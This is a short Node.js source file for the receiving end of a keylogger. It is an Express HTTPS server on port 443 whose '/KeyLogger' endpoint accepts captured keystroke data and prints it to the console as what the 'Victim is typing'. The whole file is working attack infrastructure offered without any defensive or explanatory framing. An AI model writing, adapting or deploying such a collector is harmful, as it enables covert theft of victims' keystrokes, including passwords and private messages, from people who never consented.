const express = require('express');
const https = require('https');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

const server = https.createServer({
  key: fs.readFileSync('{key file location}'),
  cert: fs.readFileSync('{crt file location}'),
}, app);

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/KeyLogger', function (req, res) {
  var receivedData = req.body.data;
  console.log('Victim is typing:', receivedData);
  res.sendStatus(200);
});

server.listen(443, () => {
  console.log('Key-Logger is listening on port 443');
});
